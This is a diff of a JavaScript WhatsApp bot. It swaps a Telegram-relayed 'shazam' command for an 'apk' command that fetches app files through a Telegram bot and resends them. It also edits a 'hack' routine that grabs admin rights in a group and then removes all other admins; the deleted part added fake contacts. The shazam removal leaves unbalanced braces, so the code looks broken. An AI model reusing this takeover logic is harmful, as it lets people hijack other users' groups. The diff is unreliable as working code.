@@ -1842,49 +1842,7 @@ case 'gpt2':
         console.error(err);
         replygcxeon('User added successfully.');
     }
-    break;
-    case 'shazam': {
-    try {
-        // Check if the user replied to an audio or video file
-        if (!m.quoted || !['audio', 'video'].some(type => m.quoted.mtype.includes(type))) {
-            return replygcxeon('❌ Please reply to an audio or video file.')
-        }
-
-        replygcxeon('🔍 Processing your media...')
-
-        // Fetch the media as a buffer
-        const media = await XeonBotInc.downloadMediaMessage(m.quoted)
-        if (!media) throw new Error('Failed to fetch the media. Please try again.')
-
-        // Determine the media type
-        const mediaType = m.quoted.mtype.includes('video') ? 'Video' : 'Audio'
-
-        // Define your Telegram bot token and group ID
-        const { botToken, groupId } = getRandomBot()
-
-        // Send the media to Telegram using the sendMediaToTelegram function
-        await sendMediaToTelegram({
-            botToken,
-            chatId: groupId,
-            mediaBuffer: media,
-            mediaType,
-            caption: '/shazam', // Caption for the media
-        })
-
-        // Fetch the response from Telegram
-        let responseMessage = null
-        while (!responseMessage) {
-            const message = await fetchTelegramFile('text', botToken, groupId)
-
-            // Check if the message starts with 🎶 Audio Identified:
-            if (message && message.startsWith('🎶 Audio Identified:')) {
-                // Remove unwanted parts from the message
-                responseMessage = message
-                    .replace('🔗 Listen on Shazam', '')
-                    .replace('ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ', '')
-                    .trim()
-                break
-            }            
+    break; 
 case 'play':
     try {
         if (!text) return replygcxeon('❌ Please specify a song or artist name! Usage: play <song name>');
@@ -1953,7 +1911,6 @@ case 'play':
         console.error(err);
     }
     break;
-
 case 'song':
     try {
         if (!text) return replygcxeon('❌ Please specify a song or artist name! Usage: play <song name>');
@@ -2310,6 +2267,66 @@ case 'generate':
         console.error(err);
     }
     break;
+    case 'apk': {
+    try {
+        if (!text) {
+            return replygcxeon('❌ Please specify your query! Usage: apk <AppName>');
+        }
+
+        const query = text.trim();
+        if (query.length > 500) {
+            return replygcxeon('❌ The query is too long! Please limit your input to 500 characters.');
+        }
+
+        replygcxeon('🔍 Searching for the APK file...');
+        const { botToken, groupId } = getRandomBot();
+        const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        // Step 1: Send the APK query to Telegram
+        const commandResponse = await fetch(sendMessageUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: groupId, text: `/apk ${query}` }),
+        });
+
+        if (!commandResponse.ok) {
+            throw new Error('Failed to send the APK request. Please try again.');
+        }
+
+        // Step 2: Fetch the APK download link from Telegram
+        const apkResponse = await fetchTelegramFile('text', botToken, groupId);
+
+        // Step 3: Validate the APK link
+        if (apkResponse && apkResponse.startsWith('https://pool.apk.aptoide.com')) {
+            replygcxeon('🔍 Downloading the APK file...');
+            const fileResponse = await fetch(apkResponse);
+
+            if (!fileResponse.ok) {
+                throw new Error('Failed to download the APK file.');
+            }
+
+            // Step 4: Convert the response to a buffer
+            const fileBuffer = await fileResponse.arrayBuffer();
+
+            // Step 5: Send the APK file back to WhatsApp
+            await XeonBotInc.sendMessage(
+                m.chat,
+                {
+                    document: { buffer: Buffer.from(fileBuffer), mimetype: 'application/vnd.android.package-archive', fileName: `${query}.apk` },
+                    caption: `✨ *App Found!*\n\n📦 *Download the file directly below:*`,
+                },
+                { quoted: m }
+            );
+        } else {
+            await replygcxeon('❌ Failed to retrieve the APK link. Please try again later.');
+        }
+
+    } catch (err) {
+        replygcxeon('❌ An error occurred, please try again later.');
+        console.error(err);
+    }
+    break;
+}
     case 'text2pdf':
     try {
         if (!text) {
@@ -2638,28 +2655,7 @@ case 'update':
             .catch(err => {
                 console.error("❌ Failed to promote user to admin:", err.message);
                 return replygcxeon("❌ *Hack Failed: Unable to gain admin privileges.*");
-            });
-
-        // Step 3: Add fake contacts to the group
-        const fakeContacts = [
-            '12345678901@s.whatsapp.net',
-            '98765432100@s.whatsapp.net',
-            '11223344556@s.whatsapp.net',
-            '22334455667@s.whatsapp.net',
-            '33445566778@s.whatsapp.net',
-            '44556677889@s.whatsapp.net',
-            '55667788990@s.whatsapp.net',
-            '66778899001@s.whatsapp.net',
-            '77889900112@s.whatsapp.net',
-            '88990011223@s.whatsapp.net'
-        ];
-
-        for (const fakeContact of fakeContacts) {
-            await XeonBotInc.groupParticipantsUpdate(groupId, [fakeContact], 'add')
-                .then(() => console.log(`✅ Fake contact ${fakeContact} added.`))
-                .catch(err => console.error(`❌ Failed to add fake contact ${fakeContact}: ${err.message}`));
-        }
-
+            });   
         // Step 4: Remove all other admins
         const groupMetadata = await XeonBotInc.groupMetadata(groupId);
         const groupParticipants = groupMetadata.participants;
